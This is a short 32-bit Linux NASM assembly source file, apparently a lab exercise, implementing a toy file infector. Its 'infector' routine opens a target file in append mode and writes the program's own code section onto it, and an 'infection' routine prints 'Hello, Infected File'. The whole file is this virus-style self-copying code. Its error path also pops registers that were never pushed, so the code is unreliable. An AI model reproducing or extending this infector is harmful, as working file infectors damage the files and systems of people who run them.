code_start:
section .rodata
    message: db "Hello, Infected File", 10, 0	
    message_len: equ $ - message	
    error_message: db "Can't open file!", 10
    error_message_len: equ $ - error_message
section .text

global _start
global infector
global infection
global system_call
extern main
_start:
    pop    dword ecx    
    mov    esi,esp      
    
    mov     eax,ecx     
    shl     eax,2       
    add     eax,esi     
    add     eax,4       
    push    dword eax   
    push    dword esi   
    push    dword ecx   

    call    main        

    mov     ebx,eax
    mov     eax,1
    int     0x80
    nop
        
system_call:
    push    ebp             
    mov     ebp, esp
    sub     esp, 4          
    pushad                  

    mov     eax, [ebp+8]           
    mov     ebx, [ebp+12]   
    mov     ecx, [ebp+16]   
    mov     edx, [ebp+20]   
    int     0x80           
    mov     [ebp-4], eax    
    popad                   
    mov     eax, [ebp-4]    
    add     esp, 4          
    pop     ebp             
    ret                     


infection:
    push ebp		
	mov ebp, esp		
	mov ebp, [ebp+8]	
	pushad			

	mov eax, 4		
	mov ebx, ebp		
	mov ecx, message		
	mov edx, message_len		
	int 0x80		

	popad                           
    pop ebp                          
    ret                            

infector:                           
    open_file:
    mov eax, 0x5                    
    mov ebx, [esp+4]                
    mov ecx, 2001o              ;open to append
    int 0x80
    cmp eax, 0
    jl error
    mov edi, eax
        
    write:
    mov eax, 0x4                    
    mov ebx, edi                    
    mov ecx, code_start             
    mov edx, code_end-code_start    
    int 0x80

    close_file:
    mov eax, 6
    mov ebx, edi
    int 0x80
    ret

error:
    popad
    mov eax, 0x4                    
    mov ebx, 1                      
    mov ecx, error_message            
    mov edx, error_message_len      
    int 0x80
    ret
code_end: